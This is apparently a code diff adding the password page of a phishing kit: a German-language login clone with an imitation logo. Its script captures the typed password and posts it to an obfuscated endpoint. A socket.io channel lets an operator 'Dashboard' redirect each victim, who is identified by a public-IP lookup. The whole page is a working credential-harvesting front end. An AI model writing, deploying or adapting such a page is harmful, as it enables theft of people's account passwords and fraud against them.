@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <header>
+    
+    </header>
+    <main>
+        <form method="post" id="pass">
+            <div class="logo">
+                <img src="img/pipillgomark.png" alt="">
+            </div>
+            <div class="change">
+                <p><%=pass%></p>
+                <a href="/">Ändern</a>
+            </div>
+            <div class="input-container">
+                <input required="" id="password" type="password" />
+                <label class="label" for="password">Passwort</label>
+                <div class="underline"></div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>Passwort vergessen?</p>
+                    <button class="btn" type="submit">Weiter</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>oder</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Registrieren</a>
+                </div>
+                <div class="third">
+                    <a href="">Arabisch</a>
+                    <hr>
+                    <a href="" class="active">Englisch</a>
+                    <hr>
+                    <a href="">Französisch</a>
+                    <hr>
+                    <a href="">Spanisch</a>
+                    <hr>
+                    <a href="">Chinesisch</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Kontaktieren Sie uns</p>
+        <p>Datenschutz</p> 
+        <p>Rechtliches</p>
+        <p>Richtlinienaktualisierungen</p>
+        <p>Weltweit</p>
+    </footer>
+
+    <script>
+        document.getElementById('pass').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+            
+            // Hide error message if password is not empty
+            
+            console.log('Login attempt:', { password });
+
+            $.ajax({
+                url: '/SSwP85AgNE4pnL5mWSM', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({password}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loading?time=5&url=/RKnUB922z6Mf4HDwg3EZ";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
